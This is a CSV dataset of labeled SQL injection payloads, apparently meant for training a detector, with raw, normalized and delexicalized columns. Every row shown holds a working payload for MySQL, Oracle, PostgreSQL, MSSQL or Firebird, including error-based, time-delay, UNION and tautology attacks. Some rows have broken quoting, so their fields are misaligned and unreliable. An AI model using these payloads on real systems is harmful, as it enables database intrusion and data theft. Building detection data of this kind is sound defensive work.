payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"1'  )   where 6772  =  6772 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --","1' ) where 6772 = 6772 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --","<NUM>' ) where <NUM> = <NUM> and row ( <NUM>,<NUM> ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from ( select <NUM> union select <NUM> union select <NUM> union select <NUM> ) a group by x ) --",1,True,,sqli_dataset
1 where 6036  =  6036 and 7533  =  7533--,1 where 6036 = 6036 and 7533 = 7533--,<NUM> where <NUM> = <NUM> and <NUM> = <NUM>--,1,False,,sqli_dataset
1%'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ',1%' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( '%' = ',<NUM>%<STR>qqpjq<STR>qzvzq<STR>%<STR>,1,False,,sqli_dataset
-8409   )    )    as ipbz where 9984  =  9984 or 3371  =  3869,-8409 ) ) as ipbz where 9984 = 9984 or 3371 = 3869,-<NUM> ) ) as ipbz where <NUM> = <NUM> or <NUM> = <NUM>,1,False,,sqli_dataset
1'   )    )    as pqbq where 1865  =  1865,1' ) ) as pqbq where 1865 = 1865,<NUM>' ) ) as pqbq where <NUM> = <NUM>,1,False,,sqli_dataset
"1""  )   where 4822  =  4822 union all select null,null,null,null,null,null,null,null,null,null--","1"" ) where 4822 = 4822 union all select null,null,null,null,null,null,null,null,null,null--","<NUM>"" ) where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null--",1,False,,sqli_dataset
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf","select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 'qomf' like 'qomf","select dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) from dual and ( <STR> like 'qomf",1,False,,sqli_dataset
"1'   )    )    union all select null,null,null,null,null--","1' ) ) union all select null,null,null,null,null--","<NUM>' ) ) union all select null,null,null,null,null--",1,False,,sqli_dataset
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'ctbs' like 'ctbs","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( 'ctbs' like 'ctbs","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( <STR> like 'ctbs",1,False,,sqli_dataset
"-6611%""   )    )     )   union all select 8918,8918#","-6611%"" ) ) ) union all select 8918,8918#","-<NUM>%"" ) ) ) union all select <NUM>,<NUM>#",1,False,,sqli_dataset
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lzyl"" like ""lzyl","call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""lzyl"" like ""lzyl","call regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) and ( ( ( <STR> like ""lzyl",1,False,,sqli_dataset
"1'   )    )    as hrra where 9533  =  9533 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","1' ) ) as hrra where 9533 = 9533 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>' ) ) as hrra where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
1%' rlike sleep  (  5  )  #,1%' rlike sleep ( 5 ) #,<NUM>%' rlike sleep ( <NUM> ) #,1,False,,sqli_dataset
1%' or sleep  (  5  )   and '%'  =  ',1%' or sleep ( 5 ) and '%' = ',<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --","1 ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --","<NUM> ) and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'xuwl' like 'xuwl","1' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'xuwl' like 'xuwl",<NUM><STR>xuwl<STR>xuwl,1,False,,sqli_dataset
"-9156'   )    )    union all select 9110,9110,9110,9110#","-9156' ) ) union all select 9110,9110,9110,9110#","-<NUM>' ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"1%'   )    )     )   and make_set  (  1543  =  5817,5817  )   and    (    (     (  '%'  =  '","1%' ) ) ) and make_set ( 1543 = 5817,5817 ) and ( ( ( '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1 where 7072  =  7072 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --","1 where 7072 = 7072 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --","<NUM> where <NUM> = <NUM> or row ( <NUM>,<NUM> ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from ( select <NUM> union select <NUM> union select <NUM> union select <NUM> ) a group by x ) --",1,True,,sqli_dataset
"1' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","1' and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>' and <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,False,,sqli_dataset
1  )   where 8433  =  8433 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1 ) where 8433 = 8433 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,<NUM> ) where <NUM> = <NUM> rlike ( select ( case when ( <NUM> = <NUM> ) then <NUM> else 0x28 end ) ) --,1,True,,sqli_dataset
"1  )   where 4710  =  4710 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","1 ) where 4710 = 4710 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --","<NUM> ) where <NUM> = <NUM> procedure analyse ( extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ,0x717a767a71 ) ) ,<NUM> ) --",1,True,,sqli_dataset
"-8640  )   or elt  (  7657  =  5020,5020  )   and   (  2346  =  2346","-8640 ) or elt ( 7657 = 5020,5020 ) and ( 2346 = 2346","-<NUM> ) or elt ( <NUM> = <NUM>,<NUM> ) and ( <NUM> = <NUM>",1,False,,sqli_dataset
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 'pgth' = 'pgth,( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) and ( <STR> = 'pgth,1,False,,sqli_dataset
"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""mejy""  =  ""mejy","1"" ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""mejy"" = ""mejy",<NUM><STR>mejy<STR>mejy,1,True,,sqli_dataset
"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","-3775' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #","-<NUM>' ) or <NUM> group by concat ( 0x7171706a71, ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) having min ( <NUM> ) #",1,True,,sqli_dataset
"1"" where 1234  =  1234","1"" where 1234 = 1234","<NUM>"" where <NUM> = <NUM>",1,False,,sqli_dataset
"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341","1 ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 2341 = 2341","<NUM> ) ) ) and elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) and ( ( ( <NUM> = <NUM>",1,False,,sqli_dataset
"-2424  )   where 8132  =  8132 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --","-2424 ) where 8132 = 8132 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --","-<NUM> ) where <NUM> = <NUM> or <NUM> = ctxsys.drithsx.sn ( <NUM>, ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) --",1,False,,sqli_dataset
"1%""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""%""  =  ""","1%"" ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1%'  )   and elt  (  4670  =  9403,9403  )   and   (  '%'  =  '","1%' ) and elt ( 4670 = 9403,9403 ) and ( '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"waitfor delay '0:0:5' and ""%""  =  ""","waitfor delay '0:0:5' and ""%"" = ""","waitfor delay <STR> and <STR> = """,1,False,,sqli_dataset
(  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ),( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1931 = 1931 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ),( select char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ),1,True,,sqli_dataset
"1%""   )    )     )   union all select null,null,null#","1%"" ) ) ) union all select null,null,null#","<NUM>%"" ) ) ) union all select null,null,null#",1,False,,sqli_dataset
1  )   where 6725  =  6725 and 1553  =  7419,1 ) where 6725 = 6725 and 1553 = 7419,<NUM> ) where <NUM> = <NUM> and <NUM> = <NUM>,1,False,,sqli_dataset
"1""  )","1"" )","<NUM>"" )",1,False,,sqli_dataset
1' where 1557  =  1557,1' where 1557 = 1557,<NUM>' where <NUM> = <NUM>,1,False,,sqli_dataset
"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#","-2246"" ) ) union all select 4613,4613,4613,4613,4613,4613#","-<NUM>"" ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'cxjp'  =  'cxjp","select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 'cxjp' = 'cxjp","select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( <STR> = 'cxjp",1,False,,sqli_dataset
"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ","-2726"" ) ) or elt ( 1032 = 1032,3623 ) and ( ( ""ococ"" = ""ococ",-<NUM><STR>ococ<STR>ococ,1,False,,sqli_dataset
"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'rqbf'  =  'rqbf","1' ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'rqbf' = 'rqbf",<NUM><STR>rqbf<STR>rqbf,1,False,,sqli_dataset
1%' waitfor delay '0:0:5' and '%'  =  ',1%' waitfor delay '0:0:5' and '%' = ',<NUM>%<STR><NUM>:<NUM>:<NUM><STR>%<STR>,1,False,,sqli_dataset
"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #","1%"" rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #","<NUM>%"" rlike ( select * from ( select ( sleep ( <NUM> ) ) ) vwyq ) #",1,False,,sqli_dataset
"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk","1"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ""cjkk"" like ""cjkk",<NUM><STR>cjkk<STR>cjkk,1,False,,sqli_dataset
1%'   )    )     )   and sleep  (  5  )  #,1%' ) ) ) and sleep ( 5 ) #,<NUM>%' ) ) ) and sleep ( <NUM> ) #,1,False,,sqli_dataset
"1""  )   as hblk where 7982  =  7982 and 9611  =  6142--","1"" ) as hblk where 7982 = 7982 and 9611 = 6142--","<NUM>"" ) as hblk where <NUM> = <NUM> and <NUM> = <NUM>--",1,False,,sqli_dataset
"-7845' union all select 9574,9574,9574,9574,9574,9574#","-7845' union all select 9574,9574,9574,9574,9574,9574#","-<NUM>' union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"1',  (  case when 8260  =  8260 then 1 else null end  )","1', ( case when 8260 = 8260 then 1 else null end )","<NUM>', ( case when <NUM> = <NUM> then <NUM> else null end )",1,False,,sqli_dataset
end and    (    (   6874  =  6874,end and ( ( 6874 = 6874,end and ( ( <NUM> = <NUM>,1,False,,sqli_dataset
"-2122""  )   as zytb where 7025  =  7025 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --","-2122"" ) as zytb where 7025 = 7025 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --","-<NUM>"" ) as zytb where <NUM> = <NUM> or <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) --",1,False,,sqli_dataset
"1"" where 8734  =  8734","1"" where 8734 = 8734","<NUM>"" where <NUM> = <NUM>",1,False,,sqli_dataset
"1""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""wmmg"" like ""wmmg","1"" ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""wmmg"" like ""wmmg",<NUM><STR>wmmg<STR>wmmg,1,False,,sqli_dataset
"-1597"" where 5933  =  5933 or 3038  =  3038","-1597"" where 5933 = 5933 or 3038 = 3038","-<NUM>"" where <NUM> = <NUM> or <NUM> = <NUM>",1,False,,sqli_dataset
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'wuux'  =  'wuux,1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 'wuux' = 'wuux,<NUM><STR>wuux<STR>wuux,1,False,,sqli_dataset
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )","1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )","<NUM>' ) and <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,False,,sqli_dataset
"1""  )   as tuem where 1328  =  1328","1"" ) as tuem where 1328 = 1328","<NUM>"" ) as tuem where <NUM> = <NUM>",1,False,,sqli_dataset
"1%'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '","1%' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ),1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),<NUM>' and <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ),1,False,,sqli_dataset
"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )","1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )","<NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null )",1,False,,sqli_dataset
